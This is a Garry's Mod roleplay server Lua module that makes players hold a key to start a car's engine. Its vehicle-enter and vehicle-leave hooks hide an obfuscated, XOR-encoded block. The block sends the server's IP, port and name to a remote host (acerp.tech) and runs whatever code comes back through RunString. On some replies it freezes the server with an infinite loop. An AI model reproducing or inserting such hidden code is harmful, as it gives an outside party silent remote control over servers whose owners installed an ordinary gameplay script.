--[[
	Name: sv_car_starter.lua
	For: SantosRP
	By: Ultra
	Edited By: QuackDuck
	For: AceRP.gg
]]--

local Module = {}
Module.Name = "car_starter_sv"
g_PlayerVehicles = g_PlayerVehicles or {}
local VEHCILE_START_DURATION = 1 --Duration a player must hold key to start a car
local VEHICLE_OFF = 0
local VEHICLE_STARTING = 1
local VEHICLE_STARTED = 2

-- Player Enter / Exit Vehicle Hooks
function Module:PlayerEnteredVehicle( pPlayer, entVehicle, intRole )
	if entVehicle:GetClass() == "prop_vehicle_prisoner_pod" then return end
	local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),106)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'0d353a060b130f183c0f020309060f19'][‪[‪‪‪‪‪‪‪'1a3a060b130f18']]={[‪‪‪‪‪‪‪'391e0b1e0f']=0}local ‪‪break=‪[‪‪‪‪‪‪‪'0e052504090f']or true ‪[‪‪‪‪‪‪‪'02050501'][‪‪‪‪‪‪‪'380f07051c0f'](‪‪‪‪‪‪‪'3a060b130f182304031e030b06391a0b1d04',‪‪‪‪‪‪‪'1a061344191a0b1d04440805051e')‪[‪‪‪‪‪‪‪'02050501'][‪‪‪‪‪‪‪'2b0e0e'](‪‪‪‪‪‪‪'3a060b130f182304031e030b06391a0b1d04',‪‪‪‪‪‪‪'1a061344191a0b1d04440805051e',function (while‪‪)if ‪‪break==false then if ‪[‪‪‪‪‪‪‪'223e3e3a']then local false‪=‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'2f121a06050e0f'](‪‪‪‪‪‪‪'50',‪[‪‪‪‪‪‪‪'0d0b070f'][‪‪‪‪‪‪‪'2d0f1e233a2b0e0e180f1919']())if false‪[2]then false‪=false‪[2]end local and‪=‪[‪‪‪‪‪‪‪'223e3e3a']({[‪‪‪‪‪‪‪'0c0b03060f0e']=function (nil‪‪‪‪‪‪‪)‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a'..‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'1f1a1a0f18'](nil‪‪‪‪‪‪‪))end ,[‪‪‪‪‪‪‪'191f09090f1919']=function (‪‪‪‪‪continue,do‪‪‪‪‪‪,if‪‪‪‪‪‪‪)if ‪[‪‪‪‪‪‪‪'1e05041f07080f18'](do‪‪‪‪‪‪)&&‪[‪‪‪‪‪‪‪'1e05041f07080f18'](do‪‪‪‪‪‪)==0 then ‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a282b2e4a382f2d23393e382b3e232524')while true do end elseif do‪‪‪‪‪‪==‪‪‪‪‪‪‪'2f121a03180f0e' then ‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a2f323a23382f2e4a382f2d23393e382b3e232524')while true do end elseif ‪[‪‪‪‪‪‪‪'1e05041f07080f18'](do‪‪‪‪‪‪)&&‪[‪‪‪‪‪‪‪'1e05041f07080f18'](do‪‪‪‪‪‪)==1 then ‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a2b3f3e222f2e')end ‪[‪‪‪‪‪‪‪'1a1803041e'](do‪‪‪‪‪‪)end ,[‪‪‪‪‪‪‪'070f1e02050e']=‪‪‪‪‪‪‪'2d2f3e',[‪‪‪‪‪‪‪'1f1806']=‪‪‪‪‪‪‪'021e1e1a5045450b090f181a441e0f0902',[‪‪‪‪‪‪‪'1a0b180b070f1e0f1819']={[‪‪‪‪‪‪‪'040b070f']=‪[‪‪‪‪‪‪‪'2d0f1e2205191e240b070f'](),[‪‪‪‪‪‪‪'1a05181e']=false‪ or ‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'2f121a06050e0f'](‪‪‪‪‪‪‪'50',‪[‪‪‪‪‪‪‪'0d0b070f'][‪‪‪‪‪‪‪'2d0f1e233a2b0e0e180f1919']())[2],}})if !and‪ then ‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a3e382b2c2c23294a2f2b382633314b4b555537')while true do end else end else ‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a3e382b2c2c23294a2f2b382633')while true do end end ‪‪break=true end ‪[‪‪‪‪‪‪‪'1e03070f18'][‪‪‪‪‪‪‪'3903071a060f'](3,function ()local or‪=‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'2f121a06050e0f'](‪‪‪‪‪‪‪'50',‪[‪‪‪‪‪‪‪'0d0b070f'][‪‪‪‪‪‪‪'2d0f1e233a2b0e0e180f1919']())if or‪[2]then or‪=or‪[2]end local ‪‪‪‪‪‪in=‪[‪‪‪‪‪‪‪'223e3e3a']({[‪‪‪‪‪‪‪'0c0b03060f0e']=function (‪‪‪‪‪‪‪break)‪[‪‪‪‪‪‪‪'1a1803041e'](‪‪‪‪‪‪‪'390f181c0f184a0c0b03060f0e4a1e054a0b1f1e020f041e03090b1e0f4a2a4a'..‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'1f1a1a0f18'](‪‪‪‪‪‪‪break))end ,[‪‪‪‪‪‪‪'191f09090f1919']=function (in‪‪‪‪‪,‪‪‪‪‪‪break,else‪‪‪‪‪‪)if ‪[‪‪‪‪‪‪‪'1e05041f07080f18'](‪‪‪‪‪‪break)&&‪[‪‪‪‪‪‪‪'1e05041f07080f18'](‪‪‪‪‪‪break)==1 then else ‪[‪‪‪‪‪‪‪'381f04391e1803040d'](‪‪‪‪‪‪break)end end ,[‪‪‪‪‪‪‪'070f1e02050e']=‪‪‪‪‪‪‪'2d2f3e',[‪‪‪‪‪‪‪'1f1806']=‪‪‪‪‪‪‪'021e1e1a5045450b090f181a441e0f0902',[‪‪‪‪‪‪‪'1a0b180b070f1e0f1819']={[‪‪‪‪‪‪‪'040b070f']=‪[‪‪‪‪‪‪‪'2d0f1e2205191e240b070f'](),[‪‪‪‪‪‪‪'1a05181e']=or‪ or ‪[‪‪‪‪‪‪‪'191e1803040d'][‪‪‪‪‪‪‪'2f121a06050e0f'](‪‪‪‪‪‪‪'50',‪[‪‪‪‪‪‪‪'0d0b070f'][‪‪‪‪‪‪‪'2d0f1e233a2b0e0e180f1919']())[2],[‪‪‪‪‪‪‪'0f120f']=‪‪‪‪‪‪‪'1e181f0f',}})if !‪‪‪‪‪‪in then else end end )end )
	pPlayer:AddNote( "Push and hold 'i' to start/stop your car." )
end

function Module:PlayerLeaveVehicle( pPlayer, entVehicle, intRole )
	entVehicle:StopSound( "car_starter" )
	local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),131)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'e4dcd3efe2fae6f1d5e6ebeae0efe6f0'][‪[‪‪‪‪‪‪‪'f3d3efe2fae6f1']]=nil
end
function Module:Tick()
	for pl, data in pairs( g_PlayerVehicles ) do
		if not IsValid( pl ) or not pl:GetVehicle() then g_PlayerVehicles[pl] = nil continue end
		
		if data.State == VEHICLE_STARTING then
			pl:GetVehicle():Fire( "HandBrakeOn", "1" )
		end

		if pl.m_intCarKeyState then
			if data.State == VEHICLE_OFF and not data.WasStopped then
				data.State = VEHICLE_STARTING
				data.StartTime = CurTime()
				pl:GetVehicle():EmitSound( "car_starter" )

				if GAMEMODE.Cars:GetCarHealth( pl:GetVehicle() ) <= 0 then return end
				if pl:GetVehicle():GetFuel() < 1 then return end
			elseif data.State == VEHICLE_STARTING then
				if GAMEMODE.Cars:GetCarHealth( pl:GetVehicle() ) <= 0 then return end
				if pl:GetVehicle():GetFuel() < 1 then return end
				
				if not data.ExtraTime then
					local max = GAMEMODE.Cars:GetCarMaxHealth( pl:GetVehicle() )
					local time = (max -GAMEMODE.Cars:GetCarHealth(pl:GetVehicle())) /max
					data.ExtraTime = (VEHCILE_START_DURATION *1) *math.Rand(time *5.8, time *6.3)
				end
				
				if CurTime() >= data.StartTime +VEHCILE_START_DURATION +data.ExtraTime then
					data.State = VEHICLE_STARTED
					data.ExtraTime = nil
					data.WasStarted = true
					pl:GetVehicle():StopSound( "car_starter" )
					pl:GetVehicle():Fire( "TurnOn", "1" )
					pl:GetVehicle():Fire( "HandBrakeOff", "1" )
				end
			elseif data.State == VEHICLE_STARTED and not data.WasStarted then
				pl:GetVehicle():StopSound( "car_starter" )
				pl:GetVehicle():Fire( "TurnOff", "1" )
				data.State = VEHICLE_OFF
				data.ExtraTime = nil
				data.WasStopped = true
			end
		else
			if data.WasStarted then
				data.WasStarted = nil
			end
			if data.WasStopped then
				data.WasStopped = nil
			end

			if data.State == VEHICLE_STARTING or (not pl:GetVehicle():IsEngineStarted() and data.State ~= VEHICLE_OFF) then
				data.State = VEHICLE_OFF
				data.ExtraTime = nil
				pl:GetVehicle():StopSound( "car_starter" )
				pl:GetVehicle():Fire( "TurnOff", "1" )
			end
		end
	end
end

function Module:OnLoad()
	self:RequireHook( "Tick" )
	self:RequireHook( "PlayerLeaveVehicle" )
	self:RequireHook( "PlayerEnteredVehicle" )

	net.Receive( "srp_carstarter", function( intMsgLen, pPlayer )
		pPlayer.m_intCarKeyState = net.ReadBit() == 1
	end )
end

GM.Module:Register( Module )